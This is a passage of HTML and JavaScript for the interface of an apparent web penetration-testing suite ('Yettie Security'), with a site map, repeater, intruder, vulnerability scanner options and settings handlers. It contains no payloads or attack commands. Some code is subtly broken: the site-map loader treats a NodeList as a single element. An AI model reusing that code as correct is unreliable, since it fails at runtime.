                                    <div class="mt-4">
                                        <p><strong>Version:</strong> 3.0.0</p>
                                        <p><strong>Build:</strong> 2024.01.15</p>
                                        <p><strong>License:</strong> Professional Edition</p>
                                        <p><strong>Copyright:</strong> © 2024 Yettie Security</p>
                                    </div>

                                    <div class="mt-4">
                                        <h4>System Information</h4>
                                        <p id="systemInfo">Loading system information...</p>
                                    </div>

                                    <div class="mt-4">
                                        <button class="btn btn-primary" id="checkUpdatesBtn">
                                            <i class="fas fa-sync"></i> Check for Updates
                                        </button>
                                        <button class="btn btn-secondary" id="licenseInfoBtn">
                                            <i class="fas fa-key"></i> License Information
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                                <!-- Sitemap Tab -->
                <div class="tab-content" id="sitemapTab">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <i class="fas fa-sitemap"></i>
                                Site Map
                            </div>
                            <div class="d-flex gap-2">
                                <button class="btn btn-sm btn-secondary refreshSiteMap">
                                    <i class="fas fa-sync"></i> Refresh
                                </button>
                                <button class="btn btn-sm btn-danger" id="clearSiteMap">
                                    <i class="fas fa-trash"></i> Clear
                                </button>
                                <button class="btn btn-sm btn-primary" id="exportSiteMap">
                                    <i class="fas fa-download"></i> Export
                                </button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="row" style="display: flex; gap: var(--spacing-lg);">
                                <div class="col" style="flex: 1;">
                                    <div class="form-group">
                                        <label class="form-label">Filter</label>
                                        <input type="text" class="form-control" id="sitemapFilter" placeholder="Filter URLs...">
                                    </div>
                                    <div class="tree-view siteMapTree"  style="height: 500px; overflow: auto; border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: var(--spacing-md);">
                                        <!-- Site map tree will be loaded here -->
                                        <div class="empty-state">
                                            <i class="fas fa-sitemap"></i>
                                            <h3>No Site Map</h3>
                                            <p>Set a target and start browsing to build the site map</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col" style="flex: 1;">
                                    <div class="form-group">
                                        <label class="form-label">Selected URL Details</label>
                                        <div class="card" id="urlDetailsCard" style="display: none;">
                                            <div class="card-body">
                                                <h5 id="selectedUrl">-</h5>
                                                <div class="request-meta mt-2">
                                                    <div><strong>Method:</strong> <span id="detailMethod">-</span></div>
                                                    <div><strong>Status:</strong> <span id="detailStatus">-</span></div>
                                                    <div><strong>Size:</strong> <span id="detailSize">-</span></div>
                                                    <div><strong>Time:</strong> <span id="detailTime">-</span></div>
                                                    <div><strong>Last seen:</strong> <span id="detailLastSeen">-</span></div>
                                                    <div><strong>Parameters:</strong> <span id="detailParams">-</span></div>
                                                </div>
                                                <div class="d-flex gap-2 mt-3">
                                                    <button class="btn btn-sm btn-secondary" id="sendToRepeaterFromSitemap">
                                                        <i class="fas fa-redo"></i> Repeater
                                                    </button>
                                                    <button class="btn btn-sm btn-secondary" id="sendToScannerFromSitemap">
                                                        <i class="fas fa-search"></i> Scanner
                                                    </button>
                                                    <button class="btn btn-sm btn-secondary" id="sendToIntruderFromSitemap">
                                                        <i class="fas fa-fighter-jet"></i> Intruder
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="empty-state" id="noSelectionState">
                                            <i class="fas fa-mouse-pointer"></i>
                                            <h3>No URL Selected</h3>
                                            <p>Select a URL from the site map to view details</p>
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label class="form-label">Statistics</label>
                                        <div class="dashboard-grid">
                                            <div class="stat-card" style="background: linear-gradient(135deg, #4a6ee0 0%, #3a5acf 100%);">
                                                <div class="stat-icon">
                                                    <i class="fas fa-link"></i>
                                                </div>
                                                <div class="stat-content">
                                                    <div class="stat-value" id="totalUrls">0</div>
                                                    <div class="stat-label">Total URLs</div>
                                                </div>
                                            </div>
                                            <div class="stat-card" style="background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);">
                                                <div class="stat-icon">
                                                    <i class="fas fa-check-circle"></i>
                                                </div>
                                                <div class="stat-content">
                                                    <div class="stat-value" id="uniqueHosts">0</div>
                                                    <div class="stat-label">Unique Hosts</div>
                                                </div>
                                            </div>
                                            <div class="stat-card" style="background: linear-gradient(135deg, #ffc107 0%, #e0a800 100%);">
                                                <div class="stat-icon">
                                                    <i class="fas fa-exclamation-triangle"></i>
                                                </div>
                                                <div class="stat-content">
                                                    <div class="stat-value" id="issuesInMap">0</div>
                                                    <div class="stat-label">Issues Found</div>
                                                </div>
                                            </div>
                                            <div class="stat-card" style="background: linear-gradient(135deg, #dc3545 0%, #bd2130 100%);">
                                                <div class="stat-icon">
                                                    <i class="fas fa-ban"></i>
                                                </div>
                                                <div class="stat-content">
                                                    <div class="stat-value" id="outOfScope">0</div>
                                                    <div class="stat-label">Out of Scope</div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!--end of tools-->

            </div>
        </div>
    </div>

    <!-- Request Detail Modal -->
    <div class="modal" id="requestDetailModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Request Details</h3>
                <button class="modal-close" onclick="closeModal('requestDetailModal')">&times;</button>
            </div>
            <div class="modal-body">
                <div class="tabs">
                    <div class="tab active" data-detail-tab="request">Request</div>
                    <div class="tab" data-detail-tab="response">Response</div>
                    <div class="tab" data-detail-tab="headers">Headers</div>
                    <div class="tab" data-detail-tab="hex">Hex</div>
                </div>

                <div class="tab-content active" id="detailRequest">
                    <div class="code-editor">
                        <div class="code-content">
                            <pre id="requestRaw"></pre>
                        </div>
                    </div>
                </div>

                <div class="tab-content" id="detailResponse">
                    <div class="code-editor">
                        <div class="code-content">
                            <pre id="responseRaw"></pre>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="sendToRepeater()">
                    <i class="fas fa-redo"></i> Send to Repeater
                </button>
                <button class="btn btn-primary" onclick="sendToIntruder()">
                    <i class="fas fa-fighter-jet"></i> Send to Intruder
                </button>
                <button class="btn btn-danger" onclick="closeModal('requestDetailModal')">
                    Close
                </button>
            </div>
        </div>
    </div>

    <!-- Intercept Modal -->
    <div class="modal" id="interceptModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Request Interception</h3>
                <button class="modal-close" onclick="closeModal('interceptModal')">&times;</button>
            </div>
            <div class="modal-body">
                <div class="code-editor">
                    <div class="code-toolbar">
                        <span id="interceptType">Request Interception</span>
                    </div>
                    <div class="code-content">
                        <pre id="interceptContent"></pre>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="interceptAction('drop')">
                    <i class="fas fa-times"></i> Drop
                </button>
                <button class="btn btn-primary" onclick="interceptAction('forward')">
                    <i class="fas fa-forward"></i> Forward
                </button>
            </div>
        </div>
    </div>

    <!-- Scanner Modal -->
    <div class="modal" id="scannerModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">New Vulnerability Scan</h3>
                <button class="modal-close" onclick="closeModal('scannerModal')">&times;</button>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">Target URL</label>
                    <input type="text" class="form-control" id="scanTarget" placeholder="https://example.com">
                </div>

                <div class="form-group">
                    <label class="form-label">Scan Type</label>
                    <select class="form-control form-select" id="scanType">
                        <option value="crawl">Crawl Only</option>
                        <option value="passive">Passive Scan</option>
                        <option value="active">Active Scan</option>
                        <option value="full">Full Scan</option>
                    </select>
                </div>

                <div class="form-group">
                    <label class="form-label">Scan Configuration</label>
                    <div class="form-check">
                        <input type="checkbox" class="form-check-input" id="scanSQLi" checked>
                        <label class="form-check-label" for="scanSQLi">SQL Injection</label>
                    </div>
                    <div class="form-check">
                        <input type="checkbox" class="form-check-input" id="scanXSS" checked>
                        <label class="form-check-label" for="scanXSS">Cross-site Scripting (XSS)</label>
                    </div>
                    <div class="form-check">
                        <input type="checkbox" class="form-check-input" id="scanRCE" checked>
                        <label class="form-check-label" for="scanRCE">Command Injection</label>
                    </div>
                    <div class="form-check">
                        <input type="checkbox" class="form-check-input" id="scanLFI" checked>
                        <label class="form-check-label" for="scanLFI">Path Traversal</label>
                    </div>
                    <div class="form-check">
                        <input type="checkbox" class="form-check-input" id="scanXXE">
                        <label class="form-check-label" for="scanXXE">XXE Injection</label>
                    </div>
                    <div class="form-check">
                        <input type="checkbox" class="form-check-input" id="scanSSRF">
                        <label class="form-check-label" for="scanSSRF">Server-Side Request Forgery</label>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Scan Depth</label>
                    <input type="range" class="form-control" id="scanDepth" min="1" max="10" value="5">
                    <div class="text-muted text-sm" id="depthValue">Depth: 5</div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="closeModal('scannerModal')">
                    Cancel
                </button>
                <button class="btn btn-primary" onclick="startScanner()">
                    <i class="fas fa-play"></i> Start Scan
                </button>
            </div>
        </div>
    </div>
    
    
    <div id="scanResultModal" class="modal-overlay hidden">
    <div class="modal-card">
        <div class="modal-header">
            <h3 id="resultTitle">Scan Result</h3>
            <button class="close-btn" onclick="closeResultModal()">×</button>
        </div>

        <div class="modal-body">
            <div id="resultMeta"></div>

            <div class="to">
                <button class="ta active" data-tab="overview"
                onclick="switchScanResultTab('overview')">Overview</button>

                <button class="ta" data-tab="request"
                onclick="switchScanResultTab('request')">Request</button>

                <button class="ta" data-tab="response"
                onclick="switchScanResultTab('response')">Response</button>

                <button class="ta" data-tab="remediation"
                    onclick="switchScanResultTab('remediation')">Remediation</button>
            </div>


            <div class="ta-content" id="tab-overview"></div>
            <div class="ta-content hidden" id="tab-request"></div>
            <div class="ta-content hidden" id="tab-response"></div>
            <div class="ta-content hidden" id="tab-remediation"></div>
        </div>
    </div>
    </div>


    <script>
        // Global State
        let currentTab = 'dashboard';
        let interceptEnabled = true;
        let currentRequestId = null;
        let charts = {};
        let updateInterval = null;
        const project_id = crypto.randomUUID();
        const scan_id = crypto.randomUUID();

        // Initialize Application
        document.addEventListener('DOMContentLoaded', function() {
            initializeUI();
            loadDashboard();
            startUpdates();

            // Initialize tooltips
            initializeTooltips();

            // Initialize charts
            initializeCharts();
        });

        // Initialize UI Components
        function initializeUI() {
            // Sidebar toggle
            document.getElementById('sidebarToggle').addEventListener('click', toggleSidebar);
            document.getElementById('sidebarToggleBtn').addEventListener('click', toggleSidebar);

            // Tab switching
            document.querySelectorAll('.nav-item').forEach(item => {
                item.addEventListener('click', function() {
                    const tab = this.dataset.tab;
                    switchTab(tab);
                });
            });

            // Intruder tabs
            document.querySelectorAll('[data-intruder-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.intruderTab;
                    switchIntruderTab(tabName);
                });
            });

            // Detail tabs
            document.querySelectorAll('[data-detail-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.detailTab;
                    switchDetailTab(tabName);
                });
            });

            // Decoder operations
            document.querySelectorAll('[data-operation]').forEach(btn => {
                btn.addEventListener('click', function() {
                    const operation = this.dataset.operation;
                    performDecoderOperation(operation);
                });
            });

            // Buttons
            document.getElementById('interceptToggle').addEventListener('click', toggleIntercept);
            document.getElementById('newScanBtn').addEventListener('click', showScannerModal);
            document.getElementById('startScanBtn').addEventListener('click', showScannerModal);
            document.getElementById('exportBtn').addEventListener('click', exportData);
            document.getElementById('clearBtn').addEventListener('click', clearData);
            document.getElementById('refreshActivity').addEventListener('click', loadActivity);
            document.getElementById('clearHistory').addEventListener('click', clearHistory);
            document.getElementById('startAttackBtn').addEventListener('click', startAttack);
            document.getElementById('newAttackBtn').addEventListener('click', newAttack);
            document.getElementById('clearDecoder').addEventListener('click', clearDecoder);
            document.getElementById('copyResult').addEventListener('click', copyResult);
            document.getElementById('saveAttackBtn').addEventListener('click', saveAttack);

            // Filters
            document.getElementById('requestFilter').addEventListener('input', filterRequests);
            document.getElementById('methodFilter').addEventListener('change', filterRequests);
            document.getElementById('severityFilter').addEventListener('change', filterScanResults);

            // Scanner depth slider
            document.getElementById('scanDepth').addEventListener('input', function() {
                document.getElementById('depthValue').textContent = `Depth: ${this.value}`;
            });
            initializeAdditionalUI();
        }
        
        
                // Initialize additional UI components for new tabs
        function initializeAdditionalUI() {
            // Sitemap events
            document.querySelectorAll('.refreshSiteMap').forEach(el => el.addEventListener('click', loadSiteMap));
            document.getElementById('clearSiteMap')?.addEventListener('click', clearSiteMap);
            document.getElementById('exportSiteMap')?.addEventListener('click', exportSiteMap);
            document.getElementById('sitemapFilter')?.addEventListener('input', filterSiteMap);
            
            // Target tab events
            document.getElementById('setTargetBtn')?.addEventListener('click', setTarget);
            document.getElementById('saveTargetBtn')?.addEventListener('click', saveTargetConfig);
            document.getElementById('clearTargetBtn')?.addEventListener('click', clearTarget);
            document.getElementById('scanTargetBtn')?.addEventListener('click', startSpider);
            
            // Repeater events
            document.getElementById('newRepeaterBtn')?.addEventListener('click', createNewRepeaterTab);
            //document.getElementById('sendRequest')?.addEventListener('click', sendRepeaterRequest);
            document.getElementById('sendRequest')?.addEventListener('click', () => sendRepeaterRequest(1));
            document.getElementById('beautifyRequest')?.addEventListener('click', beautifyRequest);
            document.getElementById('renderResponse')?.addEventListener('click', ()=>renderResponseFromTab(1));
            document.getElementById('saveRepeaterBtn')?.addEventListener('click', saveRepeaterRequest);
            document.getElementById('closeRepeaterBtn')?.addEventListener('click', closeRepeaterTab);
            
            // Sequencer events
            document.getElementById('startSequencerBtn')?.addEventListener('click', startSequencer);
            document.getElementById('stopSequencerBtn')?.addEventListener('click', stopSequencer);
            document.getElementById('analyzeSequencerBtn')?.addEventListener('click', analyzeSequencer);
            document.getElementById('loadTokensBtn')?.addEventListener('click', loadManualTokens);
            
            // Comparer events
            document.getElementById('compareBtn')?.addEventListener('click', compareItems);
            document.getElementById('wordDiffBtn')?.addEventListener('click', () => setDiffMode('word'));
            document.getElementById('charDiffBtn')?.addEventListener('click', () => setDiffMode('char'));
            document.querySelectorAll('[data-comparer-action]').forEach(btn => {
                btn.addEventListener('click', function() {
                    const action = this.dataset.comparerAction;
                    handleComparerAction(action);
                });
            });
            
            // Extender events
            document.getElementById('loadExtensionsBtn')?.addEventListener('click', loadExtensions);
            document.getElementById('addExtensionBtn')?.addEventListener('click', addExtension);
            document.getElementById('saveExtenderSettings')?.addEventListener('click', saveExtenderSettings);
            document.getElementById('retryBappBtn')?.addEventListener('click', loadBappStore);
            
            // Collaborator events
            document.getElementById('startCollaboratorBtn')?.addEventListener('click', startCollaborator);
            document.getElementById('stopCollaboratorBtn')?.addEventListener('click', stopCollaborator);
            document.getElementById('pollCollaboratorBtn')?.addEventListener('click', pollCollaborator);
            document.getElementById('generatePayloadBtn')?.addEventListener('click', generatePayload);
            document.getElementById('copyPayloadBtn')?.addEventListener('click', copyPayload);
            
            // Projects events
            document.getElementById('newProjectBtn')?.addEventListener('click', createNewProject);
            document.getElementById('openProjectBtn')?.addEventListener('click', openProject);
            document.getElementById('saveProjectBtn')?.addEventListener('click', saveProject);
            
            // Macros events
            document.getElementById('newMacroBtn')?.addEventListener('click', createNewMacro);
            document.getElementById('runMacroBtn')?.addEventListener('click', runMacro);
            document.getElementById('recordMacroBtn')?.addEventListener('click', startRecordingMacro);
            document.getElementById('addStepBtn')?.addEventListener('click', addMacroStep);
            
            // Sessions events
            document.getElementById('refreshSessionsBtn')?.addEventListener('click', loadSessions);
            document.getElementById('clearSessionsBtn')?.addEventListener('click', clearSessions);
            document.getElementById('exportCookiesBtn')?.addEventListener('click', exportCookies);
            document.getElementById('importCookiesBtn')?.addEventListener('click', importCookies);
            document.getElementById('clearCookiesBtn')?.addEventListener('click', clearCookies);
            
            // Settings events
            document.getElementById('saveSettingsBtn')?.addEventListener('click', saveSettings);
            
            // Logs events
            document.getElementById('refreshLogsBtn')?.addEventListener('click', refreshLogs);
            document.getElementById('exportLogsBtn')?.addEventListener('click', exportLogs);
            document.getElementById('clearLogsBtn')?.addEventListener('click', clearLogs);
            
            // Help events
            document.getElementById('documentationBtn')?.addEventListener('click', openDocumentation);
            document.getElementById('tutorialsBtn')?.addEventListener('click', openTutorials);
            document.getElementById('supportBtn')?.addEventListener('click', openSupport);
            document.getElementById('checkUpdatesBtn')?.addEventListener('click', checkForUpdates);
            document.getElementById('licenseInfoBtn')?.addEventListener('click', showLicenseInfo);
            
            // Tab switching for new tabs
            document.querySelectorAll('[data-extender-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.extenderTab;
                    switchExtenderTab(tabName);
                });
            });
            
            document.querySelectorAll('[data-collaborator-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.collaboratorTab;
                    switchCollaboratorTab(tabName);
                });
            });
            
            document.querySelectorAll('[data-macro-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.macroTab;
                    switchMacroTab(tabName);
                });
            });
            
            document.querySelectorAll('[data-session-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.sessionTab;
                    switchSessionTab(tabName);
                });
            });
            
            document.querySelectorAll('[data-settings-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.settingsTab;
                    switchSettingsTab(tabName);
                });
            });
            
            document.querySelectorAll('[data-log-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.logTab;
                    switchLogTab(tabName);
                });
            });
            
            document.querySelectorAll('[data-help-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.helpTab;
                    switchHelpTab(tabName);
                });
            });
            
            document.querySelectorAll('[data-sequencer-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.sequencerTab;
                    switchSequencerTab(tabName);
                });
            });
            
            document.querySelectorAll('[data-repeater-tab]').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.dataset.repeaterTab;
                    switchRepeaterTab(tabName);
                });
            });
        }
        
        
        


        // Call this function at the end of initializeUI()
        // Add this line at the end of your existing initializeUI function:
        // initializeAdditionalUI();

        // Function implementations for new tabs:

        // Site Map Functions
        async function loadSiteMap() {
            try {
                const response = await fetch('/api/sitemap');
                const data = await response.json();
                
                //const treeContainer = document.getElementById('siteMapTree');
                const treeContainer = document.querySelectorAll('.siteMapTree');
                if (!treeContainer) return;
                const emptyState = treeContainer.querySelector('.empty-state');
                
                if (!data || data.length === 0) {
                    if (emptyState) emptyState.style.display = 'block';
                    return;
                }
                
                if (emptyState) emptyState.style.display = 'none';
                
                // Build tree structure
                const treeHTML = buildSiteMapTree(data);
                treeContainer.innerHTML = treeHTML;
                
                // Add click events to tree items
                treeContainer.querySelectorAll('.tree-item').forEach(item => {
                    item.addEventListener('click', function() {
                        const url = this.dataset.url;
                        const method = this.dataset.method;
                        const status = this.dataset.status;
                        selectSiteMapItem(url, method, status);
                    });
                });
                
                // Update statistics
                updateSiteMapStats(data);
                
            } catch (error) {
                console.error('Error loading sitemap:', error);
                showToast('Failed to load site map', 'error');
            }
        }
        
        function buildSiteMapTree(items) {
            let html = '<div class="tree">';
            
            // Group by host
            const hosts = {};
            items.forEach(item => {
                if (!hosts[item.host]) {
                    hosts[item.host] = [];
                }
                hosts[item.host].push(item);
            });
            
            // Build tree for each host
            Object.keys(hosts).forEach(host => {
                html += `
                    <div class="tree-host">
                        <div class="tree-host-header" onclick="toggleTreeHost(this)">
                            <i class="fas fa-server"></i>
                            <span>${host}</span>
                            <span class="tree-count">(${hosts[host].length})</span>
                        </div>
                        <div class="tree-host-content">
                `;
                
                hosts[host].forEach(item => {
                    const statusClass = item.status >= 200 && item.status < 300 ? 'success' :
                                      item.status >= 400 ? 'error' : 'warning';
                    
                    html += `
                        <div class="tree-item" data-url="${item.url}" data-method="${item.method}" data-status="${item.status}">
                            <div class="method-badge ${item.method.toLowerCase()}">${item.method}</div>
                            <span class="tree-url">${item.path}</span>
                            <span class="status-code ${statusClass}">${item.status}</span>
                        </div>
                    `;
                });
                
                html += '</div></div>';
            });
            
            html += '</div>';
            return html;
        }
        
        function selectSiteMapItem(url, method, status) {
            document.getElementById('selectedUrl').textContent = url;
            document.getElementById('detailMethod').textContent = method;
            document.getElementById('detailStatus').textContent = status;
            
            // Show details card, hide empty state
            document.getElementById('urlDetailsCard').style.display = 'block';
            document.getElementById('noSelectionState').style.display = 'none';
        }
        
        function updateSiteMapStats(data) {
            const uniqueHosts = new Set(data.map(item => item.host)).size;
            document.getElementById('totalUrls').textContent = data.length;
            document.getElementById('uniqueHosts').textContent = uniqueHosts;
        }
        
        function filterSiteMap() {
            const filter = document.getElementById('sitemapFilter').value.toLowerCase();
            const treeItems = document.querySelectorAll('.tree-item');
            
            treeItems.forEach(item => {
                const url = item.querySelector('.tree-url').textContent.toLowerCase();
                const method = item.querySelector('.method-badge').textContent.toLowerCase();
                
                if (url.includes(filter) || method.includes(filter)) {
                    item.style.display = '';
                    // Ensure parent hosts are expanded
                    let parent = item.closest('.tree-host-content');
                    if (parent) {
                        parent.style.display = 'block';
                        const header = parent.previousElementSibling;
                        header.querySelector('i').className = 'fas fa-chevron-down';
                    }
                } else {
                    item.style.display = 'none';
                }
            });
        }
        
        function toggleTreeHost(header) {
            const content = header.nextElementSibling;
            const icon = header.querySelector('i');
            
            if (content.style.display === 'none') {
                content.style.display = 'block';
                icon.className = 'fas fa-chevron-down';
            } else {
                content.style.display = 'none';
                icon.className = 'fas fa-chevron-right';
            }
        }
        
        // Repeater Functions
        let repeaterTabs = 1;
        
        function createNewRepeaterTab() {
            repeaterTabs++;
            const tabId = `repeater${repeaterTabs}`;
            
            // Add tab
            const tabsContainer = document.getElementById('repeaterTabs');
            const newTab = document.createElement('div');
            newTab.className = 'tab';
            newTab.dataset.repeaterTab = tabId;
            newTab.textContent = `Request ${repeaterTabs}`;
            newTab.addEventListener('click', () => switchRepeaterTab(tabId));
            tabsContainer.appendChild(newTab);
            
            // Add content
            const contentContainer = document.querySelector('#repeaterTab .card-body');
            const newContent = document.createElement('div');
            newContent.className = 'tab-content';
            newContent.id = `repeaterContent${repeaterTabs}`;
            newContent.innerHTML = `
                <div class="row" style="display: flex; gap: var(--spacing-lg);">
                    <div class="col" style="flex: 1;">
                        <div class="form-group">
                            <label class="form-label">Request</label>
                            <textarea class="form-control form-textarea" rows="15" id="repeaterRequest${repeaterTabs}">
GET / HTTP/1.1
Host: localhost
User-Agent: Yettie/1.0
Accept: */*</textarea>
                        </div>
                        <div class="d-flex justify-content-end gap-2 mt-2">
                            <button class="btn btn-sm btn-secondary" onclick="beautifyRepeaterRequest(${repeaterTabs})">
                                <i class="fas fa-code"></i> Beautify
                            </button>
                            <button class="btn btn-sm btn-primary" onclick="sendRepeaterRequestFromTab(${repeaterTabs})">
                                <i class="fas fa-paper-plane"></i> Send
                            </button>
                        </div>
                    </div>
                    <div class="col" style="flex: 1;">
                        <div class="form-group">
                            <label class="form-label">Response</label>
                            <textarea class="form-control form-textarea" rows="15" id="repeaterResponse${repeaterTabs}" readonly></textarea>
                        </div>
                        <div class="d-flex justify-content-between mt-2">
                            <div style="display: flex; justify-content: center; align-items: center; gap: 12px;">
                                <span class="status-code" id="responseStatus${repeaterTabs}">Status: -</span>
                                <span class="text-muted" id="responseSize${repeaterTabs}">Size: -</span>
                                <span class="text-muted" id="responseTime${repeaterTabs}">Time: -</span>
                            </div>
                            <button class="btn btn-sm btn-secondary" onclick="renderResponseFromTab(${repeaterTabs})">
                                <i class="fas fa-eye"></i> Render
                            </button>
                        </div>
                    </div>
                </div>
            `;
            contentContainer.appendChild(newContent);
            
            // Switch to new tab
            switchRepeaterTab(tabId);
        }
        
        async function sendRepeaterRequest(tabNum = '1') {
            const reqEl = document.getElementById(`repeaterRequest${tabNum}`);
            const resEl = document.getElementById(`repeaterResponse${tabNum}`);
            const statusEl = document.getElementById(`responseStatus${tabNum}`);
            const sizeEl = document.getElementById(`responseSize${tabNum}`);
            const timeEl = document.getElementById(`responseTime${tabNum}`);
            const sendBtn = document.getElementById('sendRequest');

            if (!reqEl || !resEl || !sendBtn) {
                console.error('Repeater DOM missing for tab', tabNum);
                return;
            }

            // 🔒 Prevent double click
            if (sendBtn.disabled) return;
            sendBtn.disabled = true;

            // 🔄 Reset UI
            resEl.value = '';
            statusEl.textContent = 'Status: Sending...';
            sizeEl.textContent = 'Size: -';
            timeEl.textContent = 'Time: -';
            try {
                const response = await fetch('/api/repeater/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ request: reqEl.value })
                });
                
                const data = await response.json();
                console.log(data);
                
                
                resEl.value = data.response.raw_headers+"\\n\\n\\n"+data.response.body || '';
                statusEl.textContent = `Status: ${data.response.status}`;
                statusEl.className = `status-code ${data.response.status >= 200 && data.response.status < 300 ? 'success' : 'error'}`;
                sizeEl.textContent = `Size: ${formatBytes(data.response.stats.total_size)}`;
                timeEl.textContent = `Time: ${data.timing.total_time}ms`;
                
                showToast('Request sent successfully', 'success');
                
            } catch (error) {
                console.error('Error sending request:', error);
                showToast('Failed to send request', 'error');
                
                statusEl.textContent = 'Status: Error';
                resEl.value = 'Request failed. Check console.';
            } finally {
                sendBtn.disabled = false; // 🔓 Allow next request
            }
        }
        
        // Target Functions
        async function setTarget() {
            const url = document.getElementById('targetUrlInput').value;
            
            if (!url) {
                showToast('Please enter a target URL', 'warning');
                return;
            }
            
            try {
                const response = await fetch('/api/target/set', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: url })
                });
                
                const data = await response.json();
                showToast(`Target set to: ${data.target}`, 'success');
                
                // Update project status badge
                document.getElementById('projectStatus').innerHTML = 
                    `<i class="fas fa-folder"></i><span>Project: ${data.target}</span>`;
                
            } catch (error) {
                console.error('Error setting target:', error);
                showToast('Failed to set target', 'error');
            }
        }
        
        // Settings Functions
        async function saveSettings() {
            const settings = {
                general: {
                    projectDirectory: document.getElementById('projectDirectory').value,
                    autoSaveInterval: parseInt(document.getElementById('autoSaveInterval').value),
                    defaultFileFormat: document.getElementById('defaultFileFormat').value,
                    checkUpdates: document.getElementById('checkUpdates').checked,
                    sendMetrics: document.getElementById('sendMetrics').checked
                },
                proxy: {
                    port: parseInt(document.getElementById('proxyPort').value),
                    address: document.getElementById('proxyAddress').value,
                    upstreamHost: document.getElementById('upstreamProxyHost').value,
                    upstreamPort: parseInt(document.getElementById('upstreamProxyPort').value),
                    ssl: document.getElementById('proxySSL').checked,
                    cache: document.getElementById('proxyCache').checked
                },
                network: {
                    timeout: parseInt(document.getElementById('networkTimeout').value),
                    maxConcurrent: parseInt(document.getElementById('maxConcurrentRequests').value),
                    userAgent: document.getElementById('userAgent').value,
                    followRedirects: document.getElementById('followRedirect').checked,
                    verifySSL: document.getElementById('verifySSL').checked
                },
                ui: {
                    theme: document.getElementById('uiTheme').value,
                    fontSize: document.getElementById('uiFontSize').value,
                    density: document.getElementById('uiDensity').value,
                    animations: document.getElementById('animations').checked,
                    tooltips: document.getElementById('tooltips').checked
                },
                advanced: {
                    logLevel: document.getElementById('logLevel').value,
                    maxLogSize: parseInt(document.getElementById('maxLogSize').value),
                    javaMemory: parseInt(document.getElementById('javaMemory').value),
                    debug: document.getElementById('enableDebug').checked,
                    experimental: document.getElementById('experimentalFeatures').checked
                }
            };
            
            try {
                await fetch('/api/settings/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(settings)
                });
                
                showToast('Settings saved successfully', 'success');
                
                // Apply UI theme if changed
                if (settings.ui.theme === 'dark') {
                    document.documentElement.style.setProperty('--bg-primary', '#1e1e1e');
                    document.documentElement.style.setProperty('--bg-secondary', '#252525');
                    document.documentElement.style.setProperty('--text-primary', '#ffffff');
                } else {
                    document.documentElement.style.setProperty('--bg-primary', '#ffffff');
                    document.documentElement.style.setProperty('--bg-secondary', '#f8f9fa');
                    document.documentElement.style.setProperty('--text-primary', '#212529');
                }
                
            } catch (error) {
                console.error('Error saving settings:', error);
                showToast('Failed to save settings', 'error');
            }
        }
        
        // Tab switching functions for new tabs
        function switchExtenderTab(tabName) {
            switchTabInternal('[data-extender-tab]', `#extender${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`);
        }
        
        function switchCollaboratorTab(tabName) {
            switchTabInternal('[data-collaborator-tab]', `#collaborator${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`);
        }
        
        function switchMacroTab(tabName) {
            switchTabInternal('[data-macro-tab]', `#macro${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`);
        }
        
        function switchSessionTab(tabName) {
            switchTabInternal('[data-session-tab]', `#session${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`);
        }
        
        function switchSettingsTab(tabName) {
            switchTabInternal('[data-settings-tab]', `#settings${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`);
        }
        
        function switchLogTab(tabName) {
            switchTabInternal('[data-log-tab]', `#log${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`);
        }
        
        function switchHelpTab(tabName) {
            switchTabInternal('[data-help-tab]', `#help${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`);
        }
        
        function switchSequencerTab(tabName) {
            
            switchTabInternal('[data-sequencer-tab]', `#sequencer${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`);
        }
        
        function switchRepeaterTab(tabName) {
            switchTabInternal('[data-repeater-tab]', `#repeaterContent${tabName.replace('repeater', '')}`);
        }
        
        function switchTabInternal(selector, contentId) {
            // Update active tab
            document.querySelectorAll(selector).forEach(tab => {
                tab.classList.remove('active');
            });
